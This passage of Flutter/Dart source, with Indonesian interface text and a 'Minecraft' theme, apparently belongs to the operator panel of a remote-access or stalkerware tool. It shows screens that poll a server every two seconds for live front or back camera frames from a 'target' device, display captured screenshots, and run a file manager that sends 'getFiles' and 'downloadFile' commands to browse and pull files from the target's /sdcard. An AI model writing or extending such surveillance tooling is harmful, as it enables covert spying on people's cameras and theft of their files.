                  width: 44, height: 44,
                  decoration: BoxDecoration(
                    color: bgCard,
                    border: Border.all(color: errorColor, width: 2),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.black.withOpacity(0.6),
                        blurRadius: 0,
                        offset: const Offset(2, 2),
                      )
                    ],
                  ),
                  child: const Icon(Icons.stop, color: errorColor, size: 22),
                ),
              ),
            ),

            Positioned(
              bottom: 50, left: 0, right: 0,
              child: Center(
                child: GestureDetector(
                  onTap: widget.onCapture,
                  child: Container(
                    width: 60, height: 60,
                    decoration: BoxDecoration(
                      color: bgCard,
                      border: Border.all(color: accentWhite, width: 3),
                      boxShadow: [
                        BoxShadow(
                          color: Colors.black.withOpacity(0.7),
                          blurRadius: 0,
                          offset: const Offset(4, 4),
                        )
                      ],
                    ),
                    child: const Icon(Icons.camera_alt, color: textMain, size: 28),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════
// LIVE CAMERA POLLING PAGE - MINECRAFT
// ════════════════════════════════════════════════════════════════════════
class LiveCameraPollingPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final String facing;
  final VoidCallback onClose;
  final Function(String) onSwitchCamera;

  const LiveCameraPollingPage({
    Key? key,
    required this.targetId,
    required this.targetModel,
    required this.facing,
    required this.onClose,
    required this.onSwitchCamera,
  }) : super(key: key);

  @override
  State<LiveCameraPollingPage> createState() => _LiveCameraPollingPageState();
}

class _LiveCameraPollingPageState extends State<LiveCameraPollingPage> {
  String _currentFrame = '';
  bool _isLoading = true;
  Timer? _pollingTimer;
  String _currentFacing = '';

  @override
  void initState() {
    super.initState();
    _currentFacing = widget.facing;
    _fetchFrame();

    _pollingTimer = Timer.periodic(const Duration(seconds: 2), (timer) {
      _fetchFrame();
    });
  }

  Future<void> _fetchFrame() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final token = prefs.getString('key') ?? '';

      final response = await http.get(
        Uri.parse("$baseUrl/api/live-camera/${widget.targetId}?facing=$_currentFacing"),
        headers: {"x-auth-token": token},
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['frame'] != null && data['frame'].isNotEmpty) {
          if (mounted) {
            setState(() {
              _currentFrame = data['frame'];
              _isLoading = false;
            });
          }
        }
      }
    } catch (e) {
      // Silent fail
    }
  }

  @override
  void dispose() {
    _pollingTimer?.cancel();
    widget.onClose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Stack(
          children: [
            if (_currentFrame.isNotEmpty)
              Center(
                child: RepaintBoundary(
                  child: InteractiveViewer(
                    minScale: 0.5,
                    maxScale: 3.0,
                    child: Image.memory(
                      base64Decode(_currentFrame.split(',').last),
                      fit: BoxFit.contain,
                      width: double.infinity,
                      height: double.infinity,
                      errorBuilder: (context, error, stackTrace) {
                        return const Center(
                          child: Text(
                            "Error loading camera",
                            style: TextStyle(color: Colors.white54),
                          ),
                        );
                      },
                    ),
                  ),
                ),
              )
            else
              const Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    SizedBox(
                      width: 50,
                      height: 50,
                      child: CircularProgressIndicator(
                        color: accentWhite,
                        strokeWidth: 3,
                      ),
                    ),
                    SizedBox(height: 20),
                    Text(
                      "CONNECTING CAMERA...",
                      style: TextStyle(
                        color: textSub,
                        fontSize: 12,
                        letterSpacing: 3,
                        shadows: [
                          Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                        ],
                      ),
                    ),
                  ],
                ),
              ),

            Positioned(
              top: 0, left: 0, right: 0,
              child: Container(
                padding: const EdgeInsets.fromLTRB(20, 20, 20, 20),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [Colors.black.withOpacity(0.85), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        Container(
                          width: 10,
                          height: 10,
                          decoration: const BoxDecoration(color: accentWhite),
                        ),
                        const SizedBox(width: 10),
                        const Text(
                          "LIVE",
                          style: TextStyle(
                            color: Colors.white,
                            fontSize: 13,
                            fontWeight: FontWeight.bold,
                            letterSpacing: 2,
                            shadows: [
                              Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                            ],
                          ),
                        ),
                        const SizedBox(width: 16),
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                          decoration: BoxDecoration(
                            color: bgCard,
                            border: Border.all(color: accentWhite, width: 2),
                          ),
                          child: Text(
                            _currentFacing.toUpperCase(),
                            style: const TextStyle(
                              color: textMain,
                              fontSize: 9,
                              letterSpacing: 1,
                              shadows: [
                                Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                              ],
                            ),
                          ),
                        ),
                      ],
                    ),
                    Text(
                      widget.targetModel,
                      style: TextStyle(
                        color: Colors.white.withOpacity(0.4),
                        fontSize: 10,
                        letterSpacing: 1,
                      ),
                    ),
                  ],
                ),
              ),
            ),

            Positioned(
              top: 20, right: 20,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
                  width: 40, height: 40,
                  decoration: BoxDecoration(
                    color: bgCard,
                    border: Border.all(color: accentWhite, width: 2),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.black.withOpacity(0.6),
                        blurRadius: 0,
                        offset: const Offset(2, 2),
                      )
                    ],
                  ),
                  child: const Icon(Icons.close, color: textMain, size: 20),
                ),
              ),
            ),

            Positioned(
              bottom: 55, left: 30,
              child: GestureDetector(
                onTap: () {
                  final newFacing = _currentFacing == 'front' ? 'back' : 'front';
                  setState(() {
                    _currentFacing = newFacing;
                    _isLoading = true;
                    _currentFrame = '';
                  });
                  widget.onSwitchCamera(newFacing);
                  _fetchFrame();
                },
                child: Container(
                  width: 44, height: 44,
                  decoration: BoxDecoration(
                    color: bgCard,
                    border: Border.all(color: accentWhite, width: 2),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.black.withOpacity(0.6),
                        blurRadius: 0,
                        offset: const Offset(2, 2),
                      )
                    ],
                  ),
                  child: const Icon(Icons.switch_camera, color: textMain, size: 22),
                ),
              ),
            ),

            Positioned(
              bottom: 55, right: 30,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
                  width: 44, height: 44,
                  decoration: BoxDecoration(
                    color: bgCard,
                    border: Border.all(color: errorColor, width: 2),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.black.withOpacity(0.6),
                        blurRadius: 0,
                        offset: const Offset(2, 2),
                      )
                    ],
                  ),
                  child: const Icon(Icons.stop, color: errorColor, size: 22),
                ),
              ),
            ),

            Positioned(
              bottom: 50, left: 0, right: 0,
              child: Center(
                child: GestureDetector(
                  onTap: () {
                    _sendCommand('camera', extra: _currentFacing);
                  },
                  child: Container(
                    width: 60, height: 60,
                    decoration: BoxDecoration(
                      color: bgCard,
                      border: Border.all(color: accentWhite, width: 3),
                      boxShadow: [
                        BoxShadow(
                          color: Colors.black.withOpacity(0.7),
                          blurRadius: 0,
                          offset: const Offset(4, 4),
                        )
                      ],
                    ),
                    child: const Icon(Icons.camera_alt, color: textMain, size: 28),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _sendCommand(String command, {String? extra}) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final token = prefs.getString('key') ?? '';
      await http.post(
        Uri.parse("$baseUrl/api/command/${widget.targetId}"),
        headers: {"Content-Type": "application/json", "x-auth-token": token},
        body: jsonEncode({"command": command, "value": extra ?? ""}),
      );
    } catch (_) {}
  }
}

// ════════════════════════════════════════════════════════════════════════
// SCREENSHOT RESULT PAGE - MINECRAFT
// ════════════════════════════════════════════════════════════════════════
class ScreenshotResultPage extends StatelessWidget {
  final String targetModel;
  final String screenshotFrame;
  final String screenshotFacing;
  final VoidCallback onClose;

  const ScreenshotResultPage({
    Key? key,
    required this.targetModel,
    required this.screenshotFrame,
    required this.screenshotFacing,
    required this.onClose,
  }) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black.withOpacity(0.95),
      body: SafeArea(
        child: Stack(
          children: [
            Center(
              child: InteractiveViewer(
                minScale: 0.5,
                maxScale: 3.0,
                child: Image.memory(
                  base64Decode(screenshotFrame.split(',').last),
                  fit: BoxFit.contain,
                  width: MediaQuery.of(context).size.width * 0.9,
                  height: MediaQuery.of(context).size.height * 0.7,
                  errorBuilder: (context, error, stackTrace) {
                    return const Center(
                      child: Text(
                        "Gagal load gambar",
                        style: TextStyle(color: Colors.white54),
                      ),
                    );
                  },
                ),
              ),
            ),
            Positioned(
              top: 0, left: 0, right: 0,
              child: Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [Colors.black.withOpacity(0.85), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        Container(
                          width: 8,
                          height: 8,
                          decoration: const BoxDecoration(color: accentWhite),
                        ),
                        const SizedBox(width: 8),
                        Text(
                          "KAMERA ${screenshotFacing.toUpperCase()}",
                          style: const TextStyle(
                            color: Colors.white,
                            fontSize: 12,
                            letterSpacing: 2,
                            shadows: [
                              Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                            ],
                          ),
                        ),
                        const SizedBox(width: 12),
                        Text(
                          targetModel,
                          style: TextStyle(
                            color: Colors.white.withOpacity(0.4),
                            fontSize: 9,
                            letterSpacing: 1,
                          ),
                        ),
                      ],
                    ),
                    Text(
                      DateTime.now().toLocal().toString().substring(11, 19),
                      style: TextStyle(
                        color: Colors.white.withOpacity(0.4),
                        fontSize: 9,
                        letterSpacing: 1,
                      ),
                    ),
                  ],
                ),
              ),
            ),
            Positioned(
              top: 16, right: 16,
              child: GestureDetector(
                onTap: onClose,
                child: Container(
                  width: 40, height: 40,
                  decoration: BoxDecoration(
                    color: bgCard,
                    border: Border.all(color: accentWhite, width: 2),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.black.withOpacity(0.6),
                        blurRadius: 0,
                        offset: const Offset(2, 2),
                      )
                    ],
                  ),
                  child: const Icon(Icons.close, color: textMain, size: 20),
                ),
              ),
            ),
            Positioned(
              bottom: 0, left: 0, right: 0,
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 16, horizontal: 16),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.bottomCenter,
                    end: Alignment.topCenter,
                    colors: [Colors.black.withOpacity(0.85), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    GestureDetector(
                      onTap: () {},
                      child: Container(
                        width: 44, height: 44,
                        decoration: BoxDecoration(
                          color: bgCard,
                          border: Border.all(color: accentWhite, width: 2),
                        ),
                        child: const Icon(Icons.zoom_out, color: textMain),
                      ),
                    ),
                    const SizedBox(width: 20),
                    const Text(
                      "100%",
                      style: TextStyle(
                        color: Colors.white,
                        fontSize: 11,
                        shadows: [
                          Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                        ],
                      ),
                    ),
                    const SizedBox(width: 20),
                    GestureDetector(
                      onTap: () {},
                      child: Container(
                        width: 44, height: 44,
                        decoration: BoxDecoration(
                          color: bgCard,
                          border: Border.all(color: accentWhite, width: 2),
                        ),
                        child: const Icon(Icons.zoom_in, color: textMain),
                      ),
                    ),
                    const SizedBox(width: 24),
                    ElevatedButton.icon(
                      onPressed: () {},
                      icon: const Icon(Icons.download, size: 18),
                      label: const Text("DOWNLOAD"),
                      style: ElevatedButton.styleFrom(
                        backgroundColor: accentWhite,
                        foregroundColor: Colors.white,
                        shape: const RoundedRectangleBorder(
                          borderRadius: BorderRadius.zero,
                          side: BorderSide(color: Colors.black, width: 2),
                        ),
                      ),
                    ),
                    const SizedBox(width: 12),
                    ElevatedButton.icon(
                      onPressed: onClose,
                      icon: const Icon(Icons.close, size: 18),
                      label: const Text("TUTUP"),
                      style: ElevatedButton.styleFrom(
                        backgroundColor: bgCard,
                        foregroundColor: textMain,
                        shape: const RoundedRectangleBorder(
                          borderRadius: BorderRadius.zero,
                          side: BorderSide(color: accentWhite, width: 2),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════
// FILE MANAGER FULLSCREEN PAGE - MINECRAFT
// ════════════════════════════════════════════════════════════════════════
class FileManagerFullscreenPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final VoidCallback onClose;
  final Future<void> Function(String, {String? extra}) sendCommand;

  const FileManagerFullscreenPage({
    Key? key,
    required this.targetId,
    required this.targetModel,
    required this.onClose,
    required this.sendCommand,
  }) : super(key: key);

  @override
  State<FileManagerFullscreenPage> createState() => _FileManagerFullscreenPageState();
}

class _FileManagerFullscreenPageState extends State<FileManagerFullscreenPage> {
  List<Map<String, dynamic>> _files = [];
  String _currentPath = '/sdcard';
  List<String> _pathStack = [];
  bool _isLoading = true;
  String? _errorMessage;

  @override
  void initState() {
    super.initState();
    _navigateTo(_currentPath);
  }

  void _navigateTo(String path) async {
    setState(() {
      _isLoading = true;
      _errorMessage = null;
      _files = [];
    });

    if (path != _currentPath) {
      _pathStack.add(_currentPath);
    }
    _currentPath = path;

    try {
      await widget.sendCommand('getFiles', extra: path);
    } catch (e) {
      setState(() {
        _isLoading = false;
        _errorMessage = 'Gagal memuat folder: $e';
      });
    }
  }

  void _goBack() {
    if (_pathStack.isNotEmpty) {
      final previousPath = _pathStack.removeLast();
      _currentPath = previousPath;
      _navigateTo(previousPath);
    }
  }

  void _downloadFile(String path, String name) async {
    try {
      await widget.sendCommand('downloadFile', extra: path);
    } catch (e) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Gagal download: $e')),
      );
    }
  }

  String _formatBytes(int bytes) {
    if (bytes == 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    final i = (log(bytes) / log(k)).floor();
    return '${(bytes / pow(k, i)).toStringAsFixed(1)} ${sizes[i]}';
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgMain,
      appBar: AppBar(
        backgroundColor: bgMain,
        elevation: 0,
        leading: IconButton(
          icon: Container(
            padding: const EdgeInsets.all(6),
            decoration: BoxDecoration(
              color: bgCard,
              border: Border.all(color: accentWhite, width: 2),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.6),
                  blurRadius: 0,
                  offset: const Offset(2, 2),
                )
              ],
            ),
            child: const Icon(Icons.arrow_back_ios_new, color: textMain, size: 16),
          ),
          onPressed: widget.onClose,
        ),
        title: const Text(
          'FILE MANAGER',
          style: TextStyle(
            color: textMain,
            fontWeight: FontWeight.bold,
            fontSize: 13,
            letterSpacing: 1.5,
            shadows: [
              Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
            ],
          ),
        ),
        centerTitle: true,
        actions: [
          if (_pathStack.isNotEmpty)
            IconButton(
              icon: const Icon(Icons.arrow_back_ios, color: textSub),
              onPressed: _goBack,
            ),
        ],
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(3),
          child: Container(height: 3, color: accentWhite),
        ),
      ),
      body: Column(
        children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
            decoration: const BoxDecoration(
              color: bgSurface,
              border: Border(bottom: BorderSide(color: borderLight, width: 2)),
            ),
            child: Row(
              children: [
                const Icon(Icons.folder, color: mcGold, size: 20),
                const SizedBox(width: 8),
                Expanded(
                  child: Text(
                    _currentPath,
                    style: const TextStyle(color: textMain, fontSize: 11),
                    overflow: TextOverflow.ellipsis,
                  ),
                ),
              ],
            ),
          ),

          Expanded(
            child: _isLoading
                ? const Center(
                    child: Column(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        SizedBox(
                          width: 50,
                          height: 50,
                          child: CircularProgressIndicator(color: accentWhite, strokeWidth: 3),
                        ),
                        SizedBox(height: 20),
                        Text(
                          'Loading files...',
                          style: TextStyle(color: textSub, fontSize: 12),
                        ),
                      ],
                    ),
                  )
                : _errorMessage != null
                    ? Center(
                        child: Column(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            const Icon(Icons.error_outline, color: errorColor, size: 48),
                            const SizedBox(height: 16),
                            Text(
                              _errorMessage!,
                              style: const TextStyle(color: textSub, fontSize: 12),
                            ),
                            const SizedBox(height: 16),
                            ElevatedButton(
                              onPressed: () => _navigateTo(_currentPath),
                              style: ElevatedButton.styleFrom(
                                backgroundColor: accentWhite,
                                foregroundColor: Colors.white,
                                shape: const RoundedRectangleBorder(
                                  borderRadius: BorderRadius.zero,
                                  side: BorderSide(color: Colors.black, width: 2),
                                ),
                              ),
                              child: const Text('Retry'),
                            ),
                          ],
                        ),
                      )
                    : _files.isEmpty
                        ? const Center(
                            child: Column(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                Icon(Icons.folder_open, color: textSub, size: 48),
                                SizedBox(height: 16),
                                Text(
                                  'Folder kosong',
                                  style: TextStyle(color: textSub, fontSize: 12),
                                ),
                              ],
                            ),
                          )
                        : ListView.builder(
                            padding: const EdgeInsets.all(8),
                            itemCount: _files.length,
                            itemBuilder: (context, index) {
                              final file = _files[index];
                              final isDir = file['isDir'] == true;
                              final name = file['name'] ?? 'Unknown';
                              final path = file['path'] ?? '';
                              final size = file['size'] ?? 0;

                              return Container(
                                margin: const EdgeInsets.only(bottom: 6),
                                decoration: BoxDecoration(
                                  color: bgCard,
                                  border: Border.all(color: borderLight, width: 2),
                                  boxShadow: [
                                    BoxShadow(
                                      color: Colors.black.withOpacity(0.5),
                                      blurRadius: 0,
                                      offset: const Offset(3, 3),
                                    ),
                                  ],
                                ),
                                child: ListTile(
                                  leading: Container(
                                    width: 44,
                                    height: 44,
                                    decoration: BoxDecoration(
                                      color: bgSurface,
                                      border: Border.all(
                                        color: isDir ? mcGold : accentWhite,
                                        width: 2,
                                      ),
                                      boxShadow: [
                                        BoxShadow(
                                          color: Colors.black.withOpacity(0.5),
                                          blurRadius: 0,
                                          offset: const Offset(2, 2),
                                        ),
                                      ],
                                    ),
                                    child: Icon(
                                      isDir ? Icons.folder : Icons.insert_drive_file,
                                      color: isDir ? mcGold : accentWhite,
                                      size: 22,
                                    ),
                                  ),
                                  title: Text(
                                    name,
                                    style: const TextStyle(
                                      color: textMain,
                                      fontWeight: FontWeight.bold,
                                      fontSize: 12,
                                    ),
                                  ),
                                  subtitle: Text(
                                    isDir ? 'Folder' : _formatBytes(size),
                                    style: const TextStyle(
                                      color: textSub,
                                      fontSize: 10,
                                    ),
                                  ),
                                  trailing: isDir
                                      ? const Icon(Icons.chevron_right, color: textSub)
                                      : IconButton(
                                          icon: const Icon(Icons.download, color: textSub),
                                          onPressed: () => _downloadFile(path, name),
                                        ),
                                  onTap: () {
                                    if (isDir) {
                                      _navigateTo(path);
                                    }
                                  },
                                ),
                              );
                            },
                          ),
          ),
        ],
      ),
    );
  }
}